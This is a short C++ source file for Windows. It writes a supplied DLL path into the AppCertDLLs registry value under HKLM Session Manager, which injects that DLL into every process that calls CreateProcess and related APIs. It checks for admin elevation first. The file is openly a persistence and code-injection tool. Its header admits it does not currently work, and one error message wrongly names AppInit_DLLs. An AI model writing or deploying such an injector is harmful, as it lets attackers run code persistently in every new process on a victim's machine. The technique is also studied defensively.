/**
* Injects a .dll into every process that calls: CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec by writing it to the AppCertDLLs registry key
* Supports 32- and 64 Bit applications.
* Requires elevated priviledges
* WARNING: currently does not work. Does the dll need to be signed?
*/

#include <Windows.h>
#include <iostream>


bool IsElevated()
{
	HANDLE tokenHandle = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tokenHandle))
	{
		return false;
	}

	TOKEN_ELEVATION tokenInformation;
	DWORD returnLength;
	if (!GetTokenInformation(tokenHandle, TokenElevation, &tokenInformation, sizeof(tokenInformation), &returnLength))
	{
		CloseHandle(tokenHandle);
		return false;
	}

	CloseHandle(tokenHandle);
	return tokenInformation.TokenIsElevated;
}

bool IsOsVersionBelowWindows8()
{
	using fnRtlGetVersion = NTSTATUS(NTAPI*)(PRTL_OSVERSIONINFOW lpVersionInformation);

	HMODULE ntdllHandle = GetModuleHandleA("ntdll.dll");
	if (!ntdllHandle)
	{
		printf("[Warning] %d - Failed to get ntdll handle\n", GetLastError());
		return false;
	}

	fnRtlGetVersion RtlGetVersion = (fnRtlGetVersion)GetProcAddress(ntdllHandle, "RtlGetVersion");

	RTL_OSVERSIONINFOW osInfo;
	RtlGetVersion(&osInfo);
	return osInfo.dwMajorVersion < 8 ? true : false;
}

int main(int argc, char* argv[])
{
	char* dllPath = nullptr;

	if (argc != 2)
	{
		printf("Usage: *.exe [absoluteDllPath] \n");
		return 1;
	}

	dllPath = argv[1];

	if (!IsElevated())
	{
		printf("[Error] - Writing AppInit_DLLs requires elevated privileges\n");
		return 1;
	}

	HKEY keyHandle;
	RegOpenKeyA(HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Control\\Session Manager", &keyHandle);

	if (!keyHandle)
	{
		printf("[Error] - Failed to open registry key\n");
		return 1;
	}

	if (RegSetValueExA(keyHandle, "AppCertDLLs", 0, REG_SZ, (const BYTE*)dllPath, strlen(dllPath) + 1) != ERROR_SUCCESS)
	{
		printf("[Error] - Failed to write dll path to AppCertDLLs\n");
		return 1;
	}

	printf("[Info] - Wrote AppCertDLLs registry key\n");

	return 0;
}